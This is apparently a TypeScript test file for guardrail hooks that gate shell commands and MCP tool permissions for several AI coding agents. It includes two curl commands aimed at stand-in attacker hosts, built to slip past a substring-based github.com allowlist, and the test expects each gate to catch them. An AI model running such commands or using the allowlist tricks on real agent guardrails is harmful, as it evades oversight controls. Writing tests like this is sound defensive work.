      // `github.com` in a query param or as a subdomain suffix of an attacker domain must
      // NOT read as allowlisted. opencode is excluded — substring-keyed table; same deferral
      // as the shell-edit block above.
      const SNEAKY = [
        "curl https://evil.example/x?src=github.com",
        "curl https://github.com.attacker.io/x",
      ];
      for (const cmd of SNEAKY) {
        expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
          cmd,
          host: "cursor",
          v: "ask",
        });
        expect({ cmd, host: "codex", v: codexVerdict(cmd) }).toEqual({
          cmd,
          host: "codex",
          v: "ask",
        });
        expect({ cmd, host: "claude", flagged: advisoryText("claude", cmd) !== "" }).toEqual({
          cmd,
          host: "claude",
          flagged: true,
        });
      }
    });

    it("a bare mention of curl in another command does not trip the gate", () => {
      // `grep -n 'curl' README.md` mentions curl without running it.
      for (const cmd of ["grep -n 'curl' README.md", "echo 'use curl for this'"]) {
        expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
          cmd,
          host: "cursor",
          v: "allow",
        });
        expect({ cmd, host: "codex", v: codexVerdict(cmd) }).toEqual({
          cmd,
          host: "codex",
          v: "allow",
        });
        expect({ cmd, host: "claude", text: advisoryText("claude", cmd) }).toEqual({
          cmd,
          host: "claude",
          text: "",
        });
      }
    });
  });

  describe("cross-host gate parity — network allowlist", () => {
    it("the guardrails hook carries no hardcoded host list of its own", () => {
      // The single artifact is `.cursor/allowlist.json`, written from the registry at
      // install; the hook carries no literal list.
      const guardrails = fs.readFileSync(GUARDRAILS, "utf-8");
      expect(guardrails).not.toContain("SHIPPED_NETWORK_BASES");
      expect(guardrails).toContain(".cursor");
      expect(guardrails).toContain("allowlist.json");
    });

    it("the shipped Claude settings seed no host grants of its own", () => {
      // Grants arrive only via enrichClaudeSettingsAllows, which records what it wrote so it can
      // later prune it.
      const webFetch = claudePermissions().allow.filter((a) => a.startsWith("WebFetch(domain:"));
      expect(webFetch).toEqual([]);
    });
  });

  describe("cross-host gate parity — MCP servers", () => {
    // One `mcp-servers` block in context.md, three encodings. Every host must pre-approve
    // every tool on a declared server — and nothing on an undeclared one.
    it("a declared server is allowed on Claude, Cursor and opencode; an undeclared one is not", () => {
      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-mcp-parity-"));
      try {
        fs.mkdirSync(path.join(cwd, ".agents"), { recursive: true });
        fs.writeFileSync(
          path.join(cwd, ".agents", "context.md"),
          "<!-- bkit:end -->\n<!-- mcp-servers:start -->\nsentry\n<!-- mcp-servers:end -->\n",
        );
        const settings = path.join(cwd, "settings.json");
        fs.copyFileSync(CLAUDE_SETTINGS, settings);
        enrichClaudeSettingsAllows(settings, cwd, false, { writes: [] });
        const claudeAllow = JSON.parse(fs.readFileSync(settings, "utf-8")).permissions
          .allow as string[];

        writeCursorCliPermissionsArtifact(cwd, false);
        const cursorAllow = JSON.parse(
          fs.readFileSync(path.join(cwd, ".cursor", "cli.json"), "utf-8"),
        ).permissions.allow as string[];

        const opencodePerm = JSON.parse(
          renderOpencodeJson(OPENCODE_JSON, "github", "openrouter", cwd),
        ).permission as Record<string, unknown>;

        expect({
          claude: claudeAllow.includes("mcp__sentry__*"),
          claudeConnector: claudeAllow.includes("mcp__claude_ai_sentry__*"),
          cursor: cursorAllow.includes("Mcp(sentry:*)"),
          opencode: opencodePerm["sentry_*"],
        }).toEqual({ claude: true, claudeConnector: true, cursor: true, opencode: "allow" });

        expect({
          claude: claudeAllow.some((a) => a.includes("vercel")),
          cursor: cursorAllow.some((a) => a.includes("vercel")),
          opencode: Object.keys(opencodePerm).some((k) => k.includes("vercel")),
        }).toEqual({ claude: false, cursor: false, opencode: false });
      } finally {
        fs.rmSync(cwd, { recursive: true, force: true });
      }
    });
  });
});
